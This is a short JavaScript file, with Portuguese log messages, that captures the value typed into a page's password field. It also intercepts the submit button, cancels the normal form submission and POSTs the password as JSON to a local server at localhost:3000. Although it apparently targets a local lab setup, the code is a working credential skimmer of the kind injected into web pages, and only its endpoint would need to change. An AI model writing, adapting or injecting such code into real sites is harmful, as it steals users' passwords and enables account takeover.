let capturedPassword = '';

const capturePassword = () => {
    const passwordField = document.querySelector('input[type="password"]');

    if (passwordField) {
        passwordField.addEventListener('input', () => {
            capturedPassword = passwordField.value;
        });

        const submitButton = document.querySelector('input[type="submit"], button[type="submit"]');
        
        if (submitButton) {
            submitButton.addEventListener('click', (event) => {
                event.preventDefault();

                fetch('http://localhost:3000/submit-password', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({ password: capturedPassword })
                })
                .then(response => {
                    if (response.ok) {
                        console.log('Senha enviada com sucesso!');
                    } else {
                        console.error('Erro ao enviar a senha');
                    }
                })
                .catch(error => console.error('Erro de rede:', error));
            });
        }
    } else {
        console.log('Campo de senha não encontrado.');
    }
};

capturePassword();
